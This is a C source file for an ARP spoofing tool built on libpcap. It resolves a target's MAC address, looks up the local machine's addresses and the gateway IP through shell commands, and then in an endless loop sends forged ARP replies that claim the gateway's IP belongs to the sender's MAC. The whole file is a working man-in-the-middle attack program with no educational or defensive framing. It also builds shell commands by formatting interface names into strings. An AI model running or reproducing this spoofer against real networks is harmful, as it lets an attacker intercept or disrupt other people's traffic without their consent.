#include <netinet/in.h> // for ntohs() function
#include <pcap.h>       // for packet capturing
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>     // for sleep()
//for structure
#include <netinet/ether.h>
#include <arpa/inet.h>

void init_pcd(pcap_t **pcd, char **dev);
void getMyAddress(const char *dev, struct in_addr *myIP, struct ether_addr *myMAC);
void getGatewayIP(const char *dev, struct in_addr *gatewayIP);
int  convertIP2MAC(const char *dev, const struct in_addr IP, struct ether_addr *MAC);
void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
                              const struct in_addr fakeIP,   const struct ether_addr fakeMAC);

int main(int argc, char **argv)
{
    pcap_t *pcd;
    char *dev;

    struct in_addr      myIP,  targetIP,  gatewayIP;
    struct ether_addr   myMAC, targetMAC;

    // init
    init_pcd(&pcd, &dev);
    printf("pcd init ...done.\n");

    // check input and specify target
    if(inet_aton(argv[1], &targetIP)==0)
    {
        printf("Error: invalid IP : %s \n", argv[1]);
        exit(1);
    }
    if(convertIP2MAC(dev, targetIP, &targetMAC)==-1)
    {
        printf("Error: given IP(%s) is not in the ARP table.\n", argv[1]);
        exit(1);
    }
    printf("got target's MAC address ...done\n");

    // get info. for counterfeit
    getMyAddress(dev, &myIP, &myMAC);
    getGatewayIP(dev, &gatewayIP);

    printf("got Gateway info. ...done\n\n");

    // send fake ARP
    printf("start sending fake ARP\n");    
    sendFakeARP(pcd, targetIP, targetMAC, gatewayIP, myMAC);

    return 0;
}

void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
                              const struct in_addr fakeIP,   const struct ether_addr fakeMAC)
{
    const int ETHER_LEN = sizeof(struct ether_header);
    const int ARP_LEN   = sizeof(struct ether_arp);
    u_char packet[ETHER_LEN + ARP_LEN];
    struct ether_header etherHdr;
    struct ether_arp arpHdr;

    // Ethernet part
    etherHdr.ether_type = htons(ETHERTYPE_ARP);
    memcpy(etherHdr.ether_dhost, &targetMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(etherHdr.ether_shost, &fakeMAC.ether_addr_octet, ETHER_ADDR_LEN);

    // ARP part
    arpHdr.arp_hrd = htons(ARPHRD_ETHER);
    arpHdr.arp_pro = htons(ETHERTYPE_IP);
    arpHdr.arp_hln = ETHER_ADDR_LEN;
    arpHdr.arp_pln = sizeof(in_addr_t);
    arpHdr.arp_op  = htons(ARPOP_REPLY);
    memcpy(&arpHdr.arp_sha, &fakeMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arpHdr.arp_spa, &fakeIP.s_addr, sizeof(in_addr_t));
    memcpy(&arpHdr.arp_tha, &targetMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arpHdr.arp_tpa, &targetIP.s_addr, sizeof(in_addr_t));

    // build packet
    memcpy(packet, &etherHdr, ETHER_LEN);
    memcpy(packet+ETHER_LEN, &arpHdr, ARP_LEN);

    while(1)
    {
        // send
        if(pcap_inject(pcd,packet,sizeof(packet))==-1)
        {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        }
        sleep(1);
    }

    return;
}


void init_pcd(pcap_t **pcd, char **dev)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    *dev = pcap_lookupdev(errbuf);

    if(dev == NULL)
    {
        printf("%s\n",errbuf);
        exit(1);
    }
    
    *pcd = pcap_open_live(*dev, BUFSIZ,  1/*PROMISCUOUS*/, -1, errbuf);

    if (*pcd == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }

    return;
}


void getGatewayIP(const char *dev, struct in_addr *gatewayIP)
{
    FILE* fp;
    char cmd[256] = {0x0};
    char IPbuf[20] = {0x0};

    sprintf(cmd,"route -n | grep '%s'  | grep 'UG' | awk '{print $2}'", dev);
    
    fp = popen(cmd, "r");
    fgets(IPbuf, sizeof(IPbuf), fp);
    pclose(fp);

    inet_aton(IPbuf, gatewayIP);

    return;
}

void getMyAddress(const char *dev, struct in_addr *myIP, struct ether_addr *myMAC)
{
    FILE* fp;
    char cmd[256] = {0x0};
    char MACbuf[20] = {0x0}, IPbuf[20] = {0x0};
    
    // get MAC info    
    sprintf(cmd,"ifconfig | grep '%s' | awk '{print $5}'", dev);
    
    fp = popen(cmd, "r");
    fgets(MACbuf, sizeof(MACbuf), fp);
    pclose(fp);

    ether_aton_r(MACbuf, myMAC);

    // get IP info
    sprintf(cmd,"ifconfig | grep -A 1 '%s' | grep 'inet addr' | awk '{print $2}' | awk -F':' '{print $2}'", dev);
    
    fp = popen(cmd, "r");
    fgets(IPbuf, sizeof(IPbuf), fp);
    pclose(fp);

    inet_aton(IPbuf, myIP);

    return;
}

int convertIP2MAC(const char *dev, const struct in_addr IP, struct ether_addr *MAC)
{
    FILE* fp;
    char cmd[256] = {0x0};
    char IPbuf[20] = {0x0}, MACbuf[20] = {0x0};

    inet_ntop(AF_INET, &IP, IPbuf, sizeof(IPbuf));

    //get MAC address from ARP table
    sprintf(cmd, "ping -c 1 %s > /dev/null", IPbuf);
    system(cmd);
    sprintf(cmd,"arp | grep '%s' | grep '%s' | awk '{print $3}'", dev, IPbuf);
    fp = popen(cmd, "r");
    fgets(MACbuf, sizeof(MACbuf), fp);
    pclose(fp);

    if(strlen(MACbuf)<5) // to include LF, CR, or CRLF
        return -1;

    ether_aton_r(MACbuf, MAC);

    return 0;
}